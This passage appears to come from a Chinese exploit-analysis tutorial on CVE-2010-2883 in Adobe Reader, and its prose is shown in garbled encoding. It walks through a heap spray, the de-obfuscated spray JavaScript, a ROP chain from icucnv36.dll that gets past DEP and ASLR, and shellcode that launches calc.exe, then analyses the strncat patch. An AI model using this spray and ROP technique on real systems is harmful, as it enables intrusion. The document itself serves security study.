Heap spray æ˜¯åœ¨ shellcode çš„å‰é¢åŠ ä¸Šå¤§é‡çš„ slide codeï¼ˆæ»‘æ¿æŒ‡ä»¤ï¼‰ï¼Œç»„æˆä¸€ä¸ªæ³¨å…¥ä»£ç æ®µã€‚ç„¶åå‘ç³»ç»Ÿç”³è¯·å¤§é‡å†…å­˜ï¼Œå¹¶ä¸”åå¤ç”¨æ³¨å…¥ä»£ç æ®µæ¥å¡«å……ã€‚è¿™æ ·å°±ä½¿å¾—è¿›ç¨‹çš„åœ°å€ç©ºé—´è¢«å¤§é‡çš„æ³¨å…¥ä»£ç æ‰€å æ®ã€‚ç„¶åç»“åˆå…¶ä»–çš„æ¼æ´æ”»å‡»æŠ€æœ¯æ§åˆ¶ç¨‹åºæµï¼Œä½¿å¾—ç¨‹åºæ‰§è¡Œåˆ°å †ä¸Šï¼Œæœ€ç»ˆå°†å¯¼è‡´ shellcode çš„æ‰§è¡Œã€‚

æˆ‘ä»¬æ¥å®é™…çœ‹ä¸€ä¸‹ï¼ˆåŠ ç²—çš„åœ°æ–¹æ˜¯åé¢ä¼šç”¨åˆ°çš„ gadgets åœ°å€ï¼‰ï¼š

<pre>
0C0C0BE0  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................    <-- NOP slide
0C0C0BF0  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................
0C0C0C00  0C 0C 0C 0C 0C 0C 0C 0C 41 41 41 41 <b>A5 63 80 4A</b>  ........AAAAî™©â‚¬J
0C0C0C10  00 00 8A 4A <b>96 21 80 4A</b> <b>90 1F 80 4A</b> <b>3C 90 84 4A</b>  ..å¥?â‚¬J?â‚¬J<æ‚‡J      <-- ROP
0C0C0C20  <b>92 B6 80 4A</b> 64 10 80 4A C8 22 85 4A 00 00 00 10  æŒ¾â‚¬Jdâ‚¬J?åŒ¤...
0C0C0C30  00 00 00 00 00 00 00 00 02 00 00 00 02 01 00 00  .............
0C0C0C40  00 00 00 00 <b>A5 63 80 4A</b> <b>64 10 80 4A</b> <b>B2 2D 84 4A</b>  ....î™©â‚¬Jdâ‚¬J?å‡§
0C0C0C50  <b>B1 2A 80 4A</b> 08 00 00 00 <b>A6 A8 80 4A</b> <b>90 1F 80 4A</b>  ?â‚¬J...Î˜â‚¬J?â‚¬J
0C0C0C60  38 90 84 4A <b>92 B6 80 4A</b> <b>64 10 80 4A</b> FF FF FF FF  8æ‚‡JæŒ¾â‚¬Jdâ‚¬Jï£µï£µï£µï£µ
0C0C0C70  00 00 00 00 40 00 00 00 00 00 00 00 00 00 01 00  ....@..........
0C0C0C80  00 00 00 00 A5 63 80 4A 64 10 80 4A <b>B2 2D 84 4A</b>  ....î™©â‚¬Jdâ‚¬J?å‡§
0C0C0C90  <b>B1 2A 80 4A</b> 08 00 00 00 <b>A6 A8 80 4A</b> <b>90 1F 80 4A</b>  ?â‚¬J...Î˜â‚¬J?â‚¬J
0C0C0CA0  30 90 84 4A <b>92 B6 80 4A</b> <b>64 10 80 4A</b> FF FF FF FF  0æ‚‡JæŒ¾â‚¬Jdâ‚¬Jï£µï£µï£µï£µ
0C0C0CB0  22 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00  "..............
0C0C0CC0  A5 63 80 4A 04 00 8A 4A <b>96 21 80 4A</b> <b>A5 63 80 4A</b>  î™©â‚¬J.å¥?â‚¬Jî™©â‚¬J
0C0C0CD0  64 10 80 4A <b>B2 2D 84 4A</b> <b>B1 2A 80 4A</b> 30 00 00 00  dâ‚¬J?å‡§?â‚¬J0...
0C0C0CE0  <b>A6 A8 80 4A</b> <b>90 1F 80 4A</b> 04 00 8A 4A <b>D8 A7 80 4A</b>  Î˜â‚¬J?â‚¬J.å¥ä¸•â‚¬J
0C0C0CF0  <b>A5 63 80 4A</b> 64 10 80 4A <b>B2 2D 84 4A</b> <b>B1 2A 80 4A</b>  î™©â‚¬Jdâ‚¬J?å‡§?â‚¬J
0C0C0D00  20 00 00 00 <b>A6 A8 80 4A</b> <b>A5 63 80 4A</b> 64 10 80 4A   ...Î˜â‚¬Jî™©â‚¬Jdâ‚¬J
0C0C0D10  <b>DC AE 80 4A</b> <b>90 1F 80 4A</b> 34 00 00 00 <b>85 D5 80 4A</b>  å¢šâ‚¬J?â‚¬J4...å‘â‚¬J
0C0C0D20  <b>A5 63 80 4A</b> 64 10 80 4A <b>B2 2D 84 4A</b> <b>B1 2A 80 4A</b>  î™©â‚¬Jdâ‚¬J?å‡§?â‚¬J
0C0C0D30  0A 00 00 00 <b>A6 A8 80 4A</b> <b>90 1F 80 4A</b> 70 91 84 4A  ....Î˜â‚¬J?â‚¬Jpæ†šJ
0C0C0D40  <b>92 B6 80 4A</b> FF FF FF FF FF FF FF FF FF FF FF FF  æŒ¾â‚¬Jï£µï£µï£µï£µï£µï£µï£µï£µï£µï£µï£µï£µ
0C0C0D50  00 10 00 00 DB C1 D9 74 24 F4 BB 81 F4 49 9E 5A  ...å“¿è³¢$è‰‹ä¾“Iç€‚    <-- shellcode
0C0C0D60  29 C9 B1 31 31 5A 18 03 5A 18 83 C2 85 16 BC 62  )æ€11ZZå…Ÿ?ç³±
0C0C0D70  6D 54 3F 9B 6D 39 C9 7E 5C 79 AD 0B CE 49 A5 5E  mT?æ²µ9è“—\y?èœªî™¤
0C0C0D80  E2 22 EB 4A 71 46 24 7C 32 ED 12 B3 C3 5E 66 D2  ?éšqF$|2?è¶^f
0C0C0D90  47 9D BB 34 76 6E CE 35 BF 93 23 67 68 DF 96 98  Gæ¾”4vn?ç¹#ghé‚§
0C0C0DA0  1D 95 2A 12 6D 3B 2B C7 25 3A 1A 56 3E 65 BC 58  ?m;+?:V>eç³¥
0C0C0DB0  93 1D F5 42 F0 18 4F F8 C2 D7 4E 28 1B 17 FC 15  ?é­¾?Oî‰•è­”(?
0C0C0DC0  94 EA FC 52 12 15 8B AA 61 A8 8C 68 18 76 18 6B  æ—‰é»‚å«ªaâ–½hvk
0C0C0DD0  BA FD BA 57 3B D1 5D 13 37 9E 2A 7B 5B 21 FE F7  ç³Šç¯§;è£–7?{[!î’¾
0C0C0DE0  67 AA 01 D8 EE E8 25 FC AB AB 44 A5 11 1D 78 B5  g?ä»¡?î¶ç¶?x
0C0C0DF0  FA C2 DC BD 16 16 6D 9C 7C E9 E3 9A 32 E9 FB A4  îŒ‘èŠ™mæ¸±æ®‚?è¾‚
0C0C0E00  62 82 CA 2F ED D5 D2 E5 4A 29 99 A4 FA A2 44 3D  bå¸/ç¢šä¹‰J)æ«î‹±D=
0C0C0E10  BF AE 76 EB 83 D6 F4 1E 7B 2D E4 6A 7E 69 A2 87  æ…¨vé›°æ‹„{-é‹”~iî•¬
0C0C0E20  F2 E2 47 A8 A1 03 42 CB 24 90 0E 22 C3 10 B4 3A  èœ®GÄB??"??
0C0C0E30  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................    <-- NOP slide
0C0C0E40  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................
</pre>

é€šè¿‡ PDFStreamDumper å¯ä»¥çœ‹åˆ°å†…åµŒçš„ JavaScriptï¼Œå°†å˜é‡è¿˜åŸåä»£ç å¦‚ä¸‹ï¼š

```javascript
var shellcode = unescape( '%u4141%u4141%u63a5%u4a80%u0000 ...çœç•¥å¤§é‡å­—ç¬¦... a1%ucb42%u9024%u220e%u10c3%u3ab4' );
var rop = unescape( "%u0c0c%u0c0c" );
while (rop.length + 20 + 8 < 65536) rop+=rop;
SP = rop.substring(0, (0x0c0c-0x24)/2);
SP += shellcode;
SP += rop;
slackspace = SP.substring(0, 65536/2);
while(slackspace.length < 0x80000) slackspace += slackspace;
bigblock = slackspace.substring(0, 0x80000 - (0x1020-0x08) / 2);
var memory = new Array();
for (count=0;count<0x1f0;count++) memory[count]=bigblock+"s";
```

æ¥ä¸‹æ¥ç¨‹åºå°†ä¾æ¬¡æ‰§è¡Œä¸‹é¢çš„ gadgetsï¼š

```text
4A8063A5    59              pop ecx         ; esp = 0C0C0C14, ecx = 4A8A0000
4A8063A6    C3              retn            ; esp = 0C0C0C18, eip = 4A802196
```

```text
4A802196    8901            mov dword ptr ds:[ecx],eax
4A802198    C3              retn            ; eip = 4A801F90
```

```text
4A801F90    58              pop eax         ; eax = 4A84903C <&KERNEL32.CreateFileA>
4A801F91    C3              retn            ; esp = 0C0C0C24, eip = 4A80B692
```

```text
4A80B692  - FF20            jmp dword ptr ds:[eax]                   ; kernel32.CreateFileA
```

è°ƒç”¨å‡½æ•° `kernel32.CreateFileW` åˆ›å»ºæ–‡ä»¶ï¼Œå„å‚æ•°å¦‚ä¸‹æ‰€ç¤ºï¼š

```text
0C0C0C04   7FFDFC00  |FileName = "iso88591"
0C0C0C08   10000000  |Access = GENERIC_ALL
0C0C0C0C   00000000  |ShareMode = 0
0C0C0C10   00000000  |pSecurity = NULL
0C0C0C14   00000002  |Mode = CREATE_ALWAYS
0C0C0C18   00000102  |Attributes = HIDDEN|TEMPORARY
0C0C0C1C   00000000  \hTemplateFile = NULL
```

ç„¶åé€šè¿‡åŒæ ·çš„æ–¹æ³•è°ƒç”¨ `CreateFileMapping`ï¼š

```text
4A8063A5    59              pop ecx         ; esp = 0C0C0C4C, ecp = 4A801064
4A8063A6    C3              retn            ; esp = 0C0C0C50, eip = 4A842DB2
```

```text
4A842DB2    97              xchg eax,edi
4A842DB3    C3              retn            ; esp = 0C0C0C54, eip = 4A802AB1
```

```text
4A802AB1    5B              pop ebx         ; esp = 0C0C0C58, ebx = 00000008
4A802AB2    C3              retn            ; esp = 0C0C0C5C, eip = 4A80A8A6
```

```text
4A80A8A6    213C5C          and dword ptr ss:[esp+ebx*2],edi
4A80A8A9    75 03           jnz short icucnv36.4A80A8AE
4A80A8AB    B0 01           mov al,0x1
4A80A8AD    C3              retn
```

```text
4A80A8A6    213C5C          and dword ptr ss:[esp+ebx*2],edi
...
4A80A8C8    32C0            xor al,al
4A80A8CA    C3              retn            ; esp = 0C0C0C60, eip = 4A801F90
```

```text
4A801F90    58              pop eax         ; esp = 0C0C0C64, eax = 4A849038 <&KERNEL32.CreateFileMappingA>
4A801F91    C3              retn            ; esp = 0C0C0C68, eip = 4A80B692
```

```text
4A80B692  - FF20            jmp dword ptr ds:[eax]                   ; kernel32.CreateFileMappingA
```

è°ƒç”¨å‡½æ•° `kernel32.CreateFileMappingW` åˆ›å»ºå†…å­˜æ˜ å°„ï¼Œå„å‚æ•°å¦‚ä¸‹æ‰€ç¤ºï¼š

```text
0C0C0C40   000003D4  |hFile = 000003D4
0C0C0C44   00000000  |pSecurity = NULL
0C0C0C48   00000040  |Protection = PAGE_EXECUTE_READWRITE
0C0C0C4C   00000000  |MaximumSizeHigh = 0x0
0C0C0C50   00010000  |MaximumSizeLow = 0x10000
0C0C0C54   00000000  \MapName = NULL
```

æ¥ä¸‹æ¥æ˜¯è°ƒç”¨ `MapViewOfFile` çš„è¿‡ç¨‹ï¼š

```text
4A8063A5    59              pop ecx         ; esp = 0C0C0C8C, ecx = 4A801064
4A8063A6    C3              retn            ; esp = 0C0C0C90, eip = 4A842DB2
```

```text
4A842DB2    97              xchg eax,edi
4A842DB3    C3              retn            ; esp = 0C0C0C94, eip = 4A802AB1
```

```text
4A802AB1    5B              pop ebx         ; esp = 0C0C0C98, ebx = 00000008
4A802AB2    C3              retn            ; esp = 0C0C0C9C, eip = 4A80A8A6
```

```text
4A80A8A6    213C5C          and dword ptr ss:[esp+ebx*2],edi
...
4A80A8C8    32C0            xor al,al
4A80A8CA    C3              retn            ; esp = 0C0C0CA0, eip = 4A801F90
```

```text
4A801F90    58              pop eax         ; esp = 0C0C0CA4, eax = 4A849030 <&KERNEL32.MapViewOfFile>
4A801F91    C3              retn            ; esp = 0C0C0CA8, eip = 4A80B692
```

```text
4A80B692  - FF20            jmp dword ptr ds:[eax]                   ; kernel32.MapViewOfFile
```

è°ƒç”¨å‡½æ•° `kernel32.MapViewOfFileEx` å°†æ–‡ä»¶æ˜ å°„åˆ°å†…å­˜æ˜ å°„åœ°å€ç©ºé—´ï¼Œå„å‚æ•°å¦‚ä¸‹æ‰€ç¤ºï¼š

```text
0C0C0C8C   000003D8  |hMapObject = 000003D8
0C0C0C90   00000022  |AccessMode = 0x22
0C0C0C94   00000000  |OffsetHigh = 0x0
0C0C0C98   00000000  |OffsetLow = 0x0
0C0C0C9C   00010000  |MapSize = 10000 (65536.)
0C0C0CA0   00000000  \BaseAddr = NULL
```

æœ€åè°ƒç”¨å‡½æ•° `memcpy` å°†çœŸæ­£çš„ shellcode å¤åˆ¶åˆ° `MapViewOfFile` è¿”å›çš„åœ°å€å¤„ã€‚è¿™æ˜¯ä¸€æ®µå¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ï¼Œä»è€Œç»•è¿‡ DEPã€‚å¦å¤–ç”±äºæ‰€ä½¿ç”¨çš„ gadgets éƒ½æ¥è‡ª `icucnv36.dll` æ¨¡å—ï¼Œè¯¥æ¨¡å—ä¸å— ASLR çš„å½±å“ï¼Œæ‰€ä»¥åŒæ—¶ä¹Ÿç›¸å½“äºç»•è¿‡äº† ASLRã€‚

```text
4A8063A5    59              pop ecx         ; esp = 0C0C0CC8, ecx = 4A8A0004
4A8063A6    C3              retn            ; esp = 0C0C0CCC, eip = 4A802196
```

```text
4A802196    8901            mov dword ptr ds:[ecx],eax
4A802198    C3              retn            ; esp = 0C0C0CD0, eip = 4A8063A5
```

```text
4A8063A5    59              pop ecx         ; esp = 0C0C0CD4, ecx = 4A801064
4A8063A6    C3              retn            ; esp = 0C0C0CD8, eip = 4A842DB2
```

```text
4A842DB2    97              xchg eax,edi
4A842DB3    C3              retn            ; esp = 0C0C0CDC, eip = 4A802AB1
```

```text
4A802AB1    5B              pop ebx         ; esp = 0C0C0CE0, ebx = 00000030
4A802AB2    C3              retn            ; esp = 0C0C0CE4, eip = 4A80A8A6
```

```text
4A80A8A6    213C5C          and dword ptr ss:[esp+ebx*2],edi
...
4A80A8C8    32C0            xor al,al
4A80A8CA    C3              retn            ; esp = 0C0C0CE8, eip = 4A801F90
```

```text
4A801F90    58              pop eax         ; esp = 0C0C0CEC, eax = 4A8A0004
4A801F91    C3              retn            ; esp = 0C0C0CF0, eip = 4A80A7D8
```

```text
4A80A7D8    8B00            mov eax,dword ptr ds:[eax]
4A80A7DA    C3              retn            ; esp = 0C0C0CF4, eip = 4A8063A5
```

```text
4A8063A5    59              pop ecx         ; esp = 0C0C0CF8, ecx = 4A801064
4A8063A6    C3              retn            ; esp = 0C0C0CFC, eip = 4A842DB2
```

```text
4A842DB2    97              xchg eax,edi
4A842DB3    C3              retn            ; esp = 0C0C0D00, eip = 4A802AB1
```

```text
4A802AB1    5B              pop ebx         ; esp = 0C0C0D04, ebx = 00000020
4A802AB2    C3              retn            ; esp = 0C0C0D08, eip = 4A80A8A6
```

```text
4A80A8A6    213C5C          and dword ptr ss:[esp+ebx*2],edi
...
4A80A8C8    32C0            xor al,al
4A80A8CA    C3              retn            ; esp = 0C0C0D0C, eip = 4A8063A5
```

```text
4A8063A5    59              pop ecx         ; esp = 0C0C0D10, ecx = 4A801064
4A8063A6    C3              retn            ; esp = 0C0C0D14, eip = 4A80AEDC
```

```text
4A80AEDC    8D5424 0C       lea edx,dword ptr ss:[esp+0xC]  ; edx = 0C0C0D20
4A80AEE0    52              push edx
4A80AEE1    50              push eax
4A80AEE2    FF7424 0C       push dword ptr ss:[esp+0xC]
4A80AEE6    FF35 3C098A4A   push dword ptr ds:[0x4A8A093C]
4A80AEEC    FFD1            call ecx        ; esp = 0C0C0D00, eip = 4A801064
4A80AEEE    83C4 10         add esp,0x10
4A80AEF1    C3              retn
```

```text
4A801064    C3              retn            ; esp = 0C0C0D04, eip = 4A80AEEE
```

```text
4A80AEEE    83C4 10         add esp,0x10
4A80AEF1    C3              retn            ; esp = 0C0C0D18, eip = 4A801F90
```

```text
4A801F90    58              pop eax         ; eax = 00000034
4A801F91    C3              retn            ; esp = 0C0C0D20, eip = 4A80D585
```

```text
4A80D585    03C2            add eax,edx     ; eax = 0C0C0D54
4A80D587    C3              retn            ; esp = 0C0C0D24, eip = 4A8063A5
```

```text
4A8063A5    59              pop ecx         ; ecx = 4A801064
4A8063A6    C3              retn            ; esp = 0C0C0D2C, eip = 4A842DB2
```

```text
4A842DB2    97              xchg eax,edi
4A842DB3    C3              retn            ; esp = 0C0C0D30, eip = 4A802AB1
```

```text
4A802AB1    5B              pop ebx         ; ebx = 0000000A
4A802AB2    C3              retn            ; esp = 0C0C0D38, eip = 4A80A8A6
```

```text
4A80A8A6    213C5C          and dword ptr ss:[esp+ebx*2],edi
...
4A80A8C8    32C0            xor al,al
4A80A8CA    C3              retn            ; esp = 0C0C0D3C, eip = 4A801F90
```

```text
4A801F90    58              pop eax         ; eax = 4A849170 <&MSVCR80.memcpy>
4A801F91    C3              retn            ; esp = 0C0C0D44, eip = 4A80B692
```

```text
4A80B692  - FF20            jmp dword ptr ds:[eax]                   ; msvcr80.memcpy
```

è°ƒç”¨å‡½æ•° `memcpy`ï¼Œå„å‚æ•°å¦‚ä¸‹æ‰€ç¤ºï¼š

```text
0C0C0D44   03E90000  /CALL åˆ° memcpy
0C0C0D48   03E90000  |dest = 03E90000
0C0C0D4C   0C0C0D54  |src = 0C0C0D54
0C0C0D50   00001000  \n = 1000 (4096.)
```

ç„¶åè¿™æ®µå¤åˆ¶è¿‡å»çš„ shellcode ä¼šè¢«è§£å¯†ï¼Œå¹¶è·³åˆ° `03E900A3` æ‰§è¡Œï¼š

```text
03E9000E    B1 31           mov cl,0x31
03E90010    315A 18         xor dword ptr ds:[edx+0x18],ebx
03E90013    035A 18         add ebx,dword ptr ds:[edx+0x18]
03E90016    83C2 04         add edx,0x4
03E90019  ^ E2 F5           loopd short 03E90010
03E9001B    FC              cld
03E9001C    E8 82000000     call 03E900A3
```

```text
d 03E90000:

03E90000  DB C1 D9 74 24 F4 BB 81 F4 49 9E 5A 29 C9 B1 31  å“¿è³¢$è‰‹ä¾“Iç€‚)æ€1
03E90010  31 5A 18 03 5A 18 83 C2 04 E2 F5 FC E8 82 00 00  1ZZå…Ÿæ€©î³?.
03E90020  00 60 89 E5 31 C0 64 8B 50 30 8B 52 0C 8B 52 14  .`å¤Š1çºƒå©¸0å©».å©»
03E90030  8B 72 28 0F B7 4A 26 31 FF AC 3C 61 7C 02 2C 20  åªŸ(ç¨ª&1ï£µ?a|,
03E90040  C1 CF 0D 01 C7 E2 F2 52 57 8B 52 10 8B 4A 3C 8B  æ–™.æ°¢é¨ŒWå©»å©®<
03E90050  4C 11 78 E3 48 01 D1 51 8B 59 20 01 D3 8B 49 18  Lxé‰è£ƒåªƒ è¨ˆI
03E90060  E3 3A 49 8B 34 8B 01 D6 31 FF AC C1 CF 0D 01 C7  ?I???ï£µîƒœ?
03E90070  38 E0 75 F6 03 7D F8 3B 7D 24 75 E4 58 8B 58 24  8é„’?}?}$ué‹åª‚$
03E90080  01 D3 66 8B 0C 4B 8B 58 1C 01 D3 8B 04 8B 01 D0  è§™?Kåª‚è¨ˆ?
03E90090  89 44 24 24 5B 5B 61 59 5A 51 FF E0 5F 5F 5A 8B  å¡‚$$[[aYZQï£µéƒ·_Z
03E900A0  12 EB 8D 5D 6A 01 8D 85 B2 00 00 00 50 68 31 8B  é›¿]jå´Š?..Ph1
03E900B0  6F 87 FF D5 BB F0 B5 A2 56 68 A6 95 BD 9D FF D5  o?æ ˆé¸¬î”¼hî›ºç¶•ï£µ
03E900C0  3C 06 7C 0A 80 FB E0 75 05 BB 47 13 72 6F 6A 00  <|.â‚¬îuç±Šroj.
03E900D0  53 FF D5 63 61 6C 63 2E 65 78 65 00 0C 0C 0C 0C  Sï£µèª§alc.exe.....
03E900E0  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................
```

æœ€åå¼¹å‡ºè®¡ç®—å™¨ï¼š

```text
03E900A3    5D              pop ebp         ; ebp = 03E90021
03E900A4    6A 01           push 0x1
03E900A6    8D85 B2000000   lea eax,dword ptr ss:[ebp+0xB2] ; eax = 03E900D3 "calc.exe"
03E900AC    50              push eax
03E900AD    68 318B6F87     push 0x876F8B31
03E900B2    FFD5            call ebp
```

### è¡¥ä¸

åˆ©ç”¨ BinDiff æ’ä»¶è¿›è¡ŒäºŒè¿›åˆ¶æ¯”å¯¹ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ä¿®å¤æ¼æ´æ—¶ä½¿ç”¨å‡½æ•° `sub_813391E` æ›¿æ¢äº† `strcat`ï¼š

```text
0.92 0.97 GI-JE-C 0803DD33 sub_803DD33 0803DCF9 sub_803DCF9   call reference matching    50    52    51    220    254    247    72    84    83
```

![img](../pic/7.1.8_diff.png)

è·Ÿè¿›å‡½æ•° `sub_813391E`ï¼š

```text
.text:0813391E ; int __cdecl sub_813391E(char *Str, char *Source, int)
.text:0813391E sub_813391E     proc near               ; CODE XREF: sub_803C375+244â†‘p
.text:0813391E                                         ; sub_803C375+2BBâ†‘p ...
.text:0813391E
.text:0813391E Str             = dword ptr  4
.text:0813391E Source          = dword ptr  8
.text:0813391E arg_8           = dword ptr  0Ch
.text:0813391E
.text:0813391E                 push    esi
.text:0813391F                 mov     esi, [esp+4+Str]
.text:08133923                 push    esi             ; Str
.text:08133924                 call    strlen           ; è·å¾— uniqueName çš„é•¿åº¦ï¼Œè¿”å›å€¼åœ¨ eax ä¸­
.text:08133929                 pop     ecx
.text:0813392A                 mov     ecx, [esp+4+arg_8]   ; ecx çš„å€¼æ˜¯ 0x104
.text:0813392E                 cmp     ecx, eax             ; åˆ¤æ–­æ˜¯å¦å¤§äº 0x104 ä¸ªå­—èŠ‚
.text:08133930                 ja      short loc_8133936    ; è·³è½¬
.text:08133932                 mov     eax, esi
.text:08133934                 pop     esi
.text:08133935                 retn
.text:08133936 ; ---------------------------------------------------------------------------
.text:08133936
.text:08133936 loc_8133936:                            ; CODE XREF: sub_813391E+12â†‘j
.text:08133936                 sub     ecx, eax
.text:08133938                 dec     ecx
.text:08133939                 push    ecx             ; Count ; ecx = ecx - eax - 1
.text:0813393A                 push    [esp+8+Source]  ; Source
.text:0813393E                 add     eax, esi             ; åŠ¨æ€è°ƒæ•´æ ˆç©ºé—´
.text:08133940                 push    eax             ; Dest
.text:08133941                 call    ds:strncat           ; strncat å¤åˆ¶å­—ç¬¦ä¸²
.text:08133947                 add     esp, 0Ch
.text:0813394A                 pop     esi
.text:0813394B                 retn
.text:0813394B sub_813391E     endp
```

ä½¿ç”¨æ›´å®‰å…¨çš„ `strncat` æ›¿ä»£ `strcat`ï¼Œé™åˆ¶å­—ç¬¦ä¸²é•¿åº¦ä¸º `0x104` å­—èŠ‚ï¼Œå¹¶ä¸”æ ¹æ®å­—ç¬¦ä¸²é•¿åº¦åŠ¨æ€åœ°è°ƒæ•´æ ˆç©ºé—´ã€‚

## å‚è€ƒèµ„æ–™

- ã€Šæ¼æ´æˆ˜äº‰ã€‹
- <https://www.cvedetails.com/cve/CVE-2010-2883/>
- [PDF File Format: Basic Structure](https://resources.infosecinstitute.com/pdf-file-format-basic-structure/)
- [TrueType 1.0 Font Files](https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/minuxs/TrueType%201.0%20Font%20Files.pdf)
